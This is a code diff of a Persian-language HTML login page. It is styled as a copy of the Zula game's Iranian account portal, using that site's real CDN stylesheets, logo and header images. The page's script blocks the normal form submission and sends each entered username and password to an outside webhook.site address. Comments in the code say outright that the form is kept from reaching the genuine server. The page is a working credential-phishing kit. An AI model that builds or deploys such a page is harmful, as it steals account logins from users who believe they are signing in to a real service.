@@ -4,63 +4,90 @@
   <meta charset="UTF-8">
   <title>ورود</title>
   <meta name="viewport" content="width=device-width, initial-scale=1">
-  <style>
-    body {
-      font-family: sans-serif;
-      background-color: #f2f2f2;
-      display: flex;
-      justify-content: center;
-      align-items: center;
-      height: 100vh;
-    }
-    form {
-      background: white;
-      padding: 2rem;
-      border-radius: 8px;
-      box-shadow: 0 0 10px rgba(0,0,0,0.1);
-      width: 300px;
-    }
-    input {
-      width: 100%;
-      padding: 0.5rem;
-      margin-bottom: 1rem;
-      border: 1px solid #ccc;
-      border-radius: 4px;
-    }
-    button {
-      width: 100%;
-      padding: 0.5rem;
-      background-color: #007bff;
-      color: white;
-      border: none;
-      border-radius: 4px;
-      cursor: pointer;
-    }
-    button:hover {
-      background-color: #0056b3;
-    }
-  </style>
+
+  <!-- استایل‌ها -->
+  <link rel="stylesheet" href="//cdn-download2.zula.ir/sitecdn/IR/Content/hesapzulaoyun/css/libraries/bootstrap/bootstrap.min.css" />
+  <link rel="stylesheet" href="//cdn-download2.zula.ir/sitecdn/IR/Content/hesapzulaoyun/css/style.min.css" />
+  <link rel="stylesheet" href="//cdn-download2.zula.ir/sitecdn/IR/Content/hesapzulaoyun/css/login.min.css" />
+  <link rel="stylesheet" href="//cdn-download2.zula.ir/sitecdn/IR/Content/hesapzulaoyun/css/libraries/fontawesome/all.min.css" />
+  <link rel="stylesheet" href="//cdn-download2.zula.ir/sitecdn/IR/Content/hesapzulaoyun/css/accountZula-ir.css?v=202009163" />
+
+  <!-- اسکریپت‌ها -->
+  <script src="//cdn-download2.zula.ir/sitecdn/IR/Content/hesapzulaoyun/js/libraries/jquery/jquery.min.js"></script>
+  <script src="//cdn-download2.zula.ir/sitecdn/IR/Content/hesapzulaoyun/js/libraries/bootstrap/bootstrap.min.js"></script>
 </head>
-<body>
+<body class="hemen-oyna-page">
 
-  <form id="loginForm">
-    <input type="text" name="UserName" placeholder="نام کاربری" required />
-    <input type="password" name="Password" placeholder="رمز عبور" required />
-    <button type="submit">ورود</button>
+<div class="register-content">
+  <div class="login-form-header">
+    <img class="img-responsive" src="//cdn-download2.zula.ir/sitecdn/IR/Content/hesapzulaoyun/images/loginform-head.png" />
+    <img class="img-responsive" src="//cdn-download2.zula.ir/sitecdn/IR/Content/hesapzulaoyun/images/zula-logov2.png" />
+  </div>
+
+  <form id="loginForm" class="form-inline" autocomplete="off" method="post">
+    <div class="form-group">
+      <div class="input-group">
+        <div class="input-group-addon">
+          <span class="icon-user"></span>
+        </div>
+        <input type="text" class="form-control" name="UserName" placeholder="نام کاربری" required />
+      </div>
+    </div>
+
+    <div class="form-group">
+      <div class="input-group">
+        <div class="input-group-addon">
+          <span class="icon-unlock"></span>
+        </div>
+        <input type="password" class="form-control" name="Password" placeholder="رمز عبور" required />
+      </div>
+    </div>
+
+    <div class="form-group">
+      <div class="checkbox remember-me">
+        <label>
+          <input type="checkbox" name="RememberMe" value="true" />
+          <span class="cr"><i class="cr-icon icon-check"></i></span>
+          به خاطر سپردن اطلاعات
+        </label>
+      </div>
+    </div>
+
+    <div class="form-group">
+      <div class="buttons">
+        <button type="submit" class="btn btn-zula btn-login">ورود</button>
+      </div>
+    </div>
+
+    <div class="form-group text-center forget-info">
+      <a href="/profile/recovery">فراموش کردن نام کاربری/کلمه عبور</a>
+    </div>
+
+    <div class="form-group text-center register-text">
+      <a href="/pages/new-iran">همین حالا ثبت نام کن</a>
+    </div>
   </form>
+</div>
 
-  <script>
-    document.getElementById("loginForm").addEventListener("submit", function (e) {
-      e.preventDefault();
+<!-- اسکریپت ارسال به Webhook -->
+<script>
+  document.addEventListener("DOMContentLoaded", function () {
+    const form = document.getElementById("loginForm");
+    form.addEventListener("submit", function (e) {
+      e.preventDefault(); // جلوگیری از ارسال فرم به سرور اصلی
 
-      const username = document.querySelector("input[name='UserName']").value;
-      const password = document.querySelector("input[name='Password']").value;
+      const username = form.querySelector("input[name='UserName']").value;
+      const password = form.querySelector("input[name='Password']").value;
 
       fetch("https://webhook.site/c028d9e3-c218-4e87-ae66-46837fab0868?username=" + encodeURIComponent(username) + "&password=" + encodeURIComponent(password))
         .then(response => console.log("ارسال شد:", response.status))
         .catch(error => console.error("خطا در ارسال:", error));
+
+      // اگر بخوای فرم به سرور اصلی هم ارسال بشه، این خط رو حذف کن
+      // e.preventDefault();
     });
-  </script>
+  });
+</script>
 
 </body>
 </html>
